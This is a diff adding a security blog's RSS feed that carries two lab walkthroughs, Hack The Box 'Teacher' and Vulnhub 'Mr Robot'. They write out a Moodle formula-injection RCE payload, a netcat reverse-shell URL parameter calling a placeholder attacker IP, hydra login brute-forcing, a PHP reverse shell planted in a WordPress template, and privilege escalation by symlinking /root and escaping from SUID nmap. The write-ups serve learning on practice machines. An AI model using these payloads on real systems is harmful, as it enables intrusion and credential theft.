@@ -1,0 +1,284 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>JiebsSecurity</title>
+    <description>Life long student with a passion towards cyber security.</description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
+    <pubDate>Mon, 06 Jan 2020 19:55:26 +0100</pubDate>
+    <lastBuildDate>Mon, 06 Jan 2020 19:55:26 +0100</lastBuildDate>
+    <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title>Hack The Box: Teacher - Walkthrough</title>
+        <description>&lt;p&gt;One of the first hack the box machines that i’ve rooted. This box took me hella long, but in the end it paid off. Here is my walkthrough of the machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;As always we will start off with our nmap scan.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkdir scans
+nmap -sV -sC -oA scans/nmapinitial 10.10.10.153
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;HTTP is running on port 80. I decided to run dirb in the background and do some manual enumeration in the meantime.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dirb http://10.10.10.153
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In our nmap result we noticed that the website is titled ‘blackhat highschool’. In the source on the gallery page i found something interesting.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There is only 1 image with an onerror atribute to print something in the console. It’s also not displaying properly on the gallery page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;When going directly to the image itself it gives us an error.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Interesting. The file can be corrupted but i decided to do some more research to determine whether it’s something more.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Great, we have a username and a password that is missing it’s last character. In the meantime our dirb scan has finished and it’s found the /moodle directory with a login function. I searched for possible exploits using searchsploit but most involved getting acces to a teachers account.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Great, we have our entry point; the login page for the moodle directory and a username + password that is missing it’s final character. I decided to create a custom wordlist with all the possible characters and run it through hydra.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Cool, we have the password. Let’s login!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2&gt;Exploitation&lt;/h2&gt;
+&lt;p&gt;After enumerating without any success I decided to search on Google and found an interesting article. You can visit the article by clicking &lt;a href=&quot;https://blog.ripstech.com/2018/moodle-remote-code-execution/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;You can follow the video in the article for this part as it’s perfectly explained. I’ll go through this rather quickly.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Go to Algebra course &amp;gt; select the quiz &amp;gt; Edit Quiz &amp;gt; Add a new question &amp;gt; Choose Calculated &amp;gt; Click Add &amp;gt; Put something random in question name and text as they're required. 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In the Formula field, add:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/*{a*/`$_GET[t]`;//{x}}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Put grade to 100% and press Save Changes &amp;gt; Next page and once done you’ll see a page with ‘ Edit the wildcards datasets’ somewhere in the center of the screen. Next we are able to pass system commands through a url parameter called ‘t’. For more information please visit the previously mentioned article.&lt;/p&gt;
+
+&lt;p&gt;Add this to the end of the url and make sure your netcat is listening on the specified port.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;amp;t=(date;nc -e /bin/sh IP 9001)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once you’ve send the request, our listener will get a callback and we get a reverse shell as www-data.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we are unable to view the home directory of giovanni, we have to escalate privileges.&lt;/p&gt;
+
+&lt;h2&gt;Privilege Escalation to giovanni&lt;/h2&gt;
+&lt;p&gt;I decided to go through the moodle directory in /var/www/html/moodle and check the config files and stuff to see if there is anything interesting.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nice, database credentials! Let’s see if there’s anything juicy stored in there.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can check out the list of databases with:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SHOW DATABASES;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Moodle is interesting and might have some passwords.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;USE moodle;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Check the tables.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SHOW TABLES;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We get a bunch of tables, mdl_user sounds interesting.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SELECT * FROM mdl_user;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I went over the output and found an md5 hash. Searched online for an online md5 cracker and got a result.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The password is ‘expelled’, we can su to giovanni.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In giovanni’s home directory we find the user.txt!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2&gt;Getting root.txt&lt;/h2&gt;
+&lt;p&gt;In giovanni’s home directory there is a directory called work, which has two directoies courses and tmp. After enumerating for a while i found a backup.sh script in /usr/bin. When i took a look at this script i noticed that it’s backing up data and changing directories with 777 recursively.&lt;/p&gt;
+
+&lt;p&gt;I watched alot of ippsec’s write-ups about retired machines. This situation reminded me of a write up about the Joker machine. The technique i learned in this video can be used here. We can create a symlink and trick the system into backing up the root directory in /home/giovanni/work/courses. Let’s create our symlink!&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ln -s /root/ courses
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once done, we just had to wait for a bit and we got root key!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/2/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading and happy hacking!&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 29 May 2019 17:04:23 +0200</pubDate>
+        <link>http://localhost:4000/2019/htb-teacher-walkthrough/</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/htb-teacher-walkthrough/</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Vulnhub: Mr Robot - Walkthrough</title>
+        <description>&lt;p&gt;This might officially be the first box that i’ve ever attempted. I was a total pleb at the time and it took me hella long to figure it all out. In the end it was all worth it :)&lt;/p&gt;
+
+&lt;h2&gt;Description from author&lt;/h2&gt;
+&lt;p&gt;Based on the show, Mr. Robot.
+This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find.
+The VM isn’t too difficult. There isn’t any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.&lt;/p&gt;
+
+&lt;h2&gt;Information Gathering&lt;/h2&gt;
+&lt;p&gt;Let’s start with a simple port scan.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkdir scans
+nmap -sC -Pn -sV -oA scans/nmap_initial 10.0.2.4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/1/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nothing too interesting, just a webserver running on the background and ssh. Let’s run Nikto in the background when we’re going to manually enumerate the web application.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nikto -h 10.0.2.4 -o scans/nikto.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Searched for common files and folders and found something interesting in /robots.txt!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/1/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Great, the 1st out of 3 keys has been found. We also found an interesting .dic file. I downloaded them with wget. Going through the .dic file i found out that there were alot of duplicates, so i decided to sort the list and save it for later use.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat fsocity.dic| sort -u | uniq &amp;gt; uniq_fsocity.dic
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In the meantime our Nikto scan hs finished, let’s take a look at the results.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/1/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;WordPress is running in the background. The first thing i do when i know WordPress is installed is run wpscan but nothing too interesting came up. It wasn’t able to enumerate users either.&lt;/p&gt;
+
+&lt;p&gt;Luckily for us, we know we can bruteforce user and password in a HTTP form with Hydra. Here is the POST request made when we try to login in /wp-login.php&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/1/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In the POST request 2 parameters are being used; log and pwd. Let’s run Hydra to figure out the username and password!&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -vV -L uniq_fsocity.dic -p jiebs 10.0.2.4 http-post-form '/wp-login.php:log=^USER^&amp;amp;pwd=^PASS^&amp;amp;wp-submit=Log+In:F=Invalid username'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After abit of waiting we get the username.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[80][http-post-form] host: 10.0.2.4 login: elliot password: jiebs
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s try and grab the password with the same .dic file now.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra -vV -l elliot -P uniq_fsocity.dic 10.0.2.4 http-post-form '/wp-login.php:log=^USER^&amp;amp;pwd=^PASS^&amp;amp;wp-submit=Log+In:F=is incorrect'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Again after a bit of waiting we get the password.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[80][http-post-form] host: 10.0.2.4 login: elliot password: ER28-0652
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Great, we have the username and password. Let’s log in and start the exploitation part!&lt;/p&gt;
+
+&lt;h2&gt;Exploitation&lt;/h2&gt;
+&lt;p&gt;After some poking around in the wp admin panel i figured i should try and upload a reverse shell. I got mine from pentestmonkeys, make sure you change the ip and port. Go to Appearance &amp;gt; Editor &amp;gt; 404 Template (404.php) &amp;gt; paste the .php script &amp;gt; click Upload.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/1/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s make sure we’re listening to the port.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -lvp 1234
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Once you’re listening to the port lets get our reverse shell going.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://10.0.2.4/404.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/1/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Great, our reverse shell is running. Let’s quickly spawn a TTY shell and start snooping around!&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c 'import pty; pty.spawn(&quot;/bin/sh&quot;)'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After searching around i found an interesting directory(/home/robot) with the 2nd key!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/1/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried to cat the 2nd key, however we get permission denied. Luckily we noticed the password.raw-md5 file which sounds really interesting!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/1/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looks like a password hash for the robot user! I went online and cracked the hash, result: “abcdefghijklmnopqrstuvwxyz”. Let’s go ahead and switch to the robot user.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/1/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s see if we can cat the 2nd key now that we’re on a low privileged user.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/1/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Great, now lets move and get root!&lt;/p&gt;
+
+&lt;h2&gt;Privilege escalation&lt;/h2&gt;
+&lt;p&gt;After going through a bunch of directories and files looking for hints, i started looking at binaries with the SUID bit set.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/1/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can run nmap as root since it’s SUID bit is set. Let’s check out the version. In older versions of nmap you are able to run it in interactive mode and escape to shell. Since the SUID bit is set, we’ll be able to escape to ‘root’ shell.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/1/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let’s check out the root directory for the last flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/1/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading and happy hacking!&lt;/p&gt;
+</description>
+        <pubDate>Wed, 24 Apr 2019 17:04:23 +0200</pubDate>
+        <link>http://localhost:4000/2019/vulnhub-mrrobot-walkthrough/</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/vulnhub-mrrobot-walkthrough/</guid>
+        
+        
+      </item>
+    
+  </channel>
+</rss>
